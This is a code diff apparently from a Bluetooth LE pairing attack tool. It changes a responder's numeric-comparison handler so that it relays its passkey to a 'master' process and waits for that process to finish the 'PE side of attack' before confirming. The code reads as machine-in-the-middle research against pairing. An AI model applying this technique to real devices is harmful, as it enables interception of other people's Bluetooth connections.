@@ -75,20 +75,20 @@ const uint8_t adv_data[] = {
 };
 const uint8_t adv_data_len = sizeof(adv_data);
 
-// static void ipc_read(int fd, char *buf, size_t size)
-// {
-// 	if((size_t)read(fd, buf, size) != size)
-// 	{
-// 		printf("MASTER: IPC read error\n");
-// 		raise(SIGINT);
-// 	}
-// }
+static void ipc_read(int fd, char *buf, size_t size)
+{
+	if((size_t)read(fd, buf, size) != size)
+	{
+		printf("RESP: IPC read error\n");
+		raise(SIGINT);
+	}
+}
 
 static void ipc_write(int fd, char *buf, size_t size)
 {
 	if((size_t)write(fd, buf, size) != size)
 	{
-		printf("MASTER: IPC write error\n");
+		printf("RESP: IPC write error\n");
 		raise(SIGINT);
 	}
 }
@@ -215,10 +215,12 @@ static void responder_sm_packet_handler(uint8_t packet_type, uint16_t channel, u
 					sm_just_works_confirm(sm_event_just_works_request_get_handle(packet));
 					break;
 				case SM_EVENT_NUMERIC_COMPARISON_REQUEST:
-					printf("\n\nRESP: Confirming numeric comparison: \e[31m%06d\e[0m\n\n\n", sm_event_numeric_comparison_request_get_passkey(packet));
 					passkey = sm_event_numeric_comparison_request_get_passkey(packet);
 					/* Tell first displayed value (va) to master */
 					ipc_write(responder_to_master, (char*)&passkey, sizeof(uint32_t));
+					/* Wait for master to tell us that it's initiator side has completed the PE side of attack */
+					ipc_read(responder_from_master, buf, 1);
+					printf("\n\nRESP: Confirming numeric comparison: \e[31m%06d\e[0m\n\n\n", sm_event_numeric_comparison_request_get_passkey(packet));
 					sm_numeric_comparison_confirm(sm_event_passkey_display_number_get_handle(packet));
 					break;
 				case SM_EVENT_PASSKEY_INPUT_NUMBER:
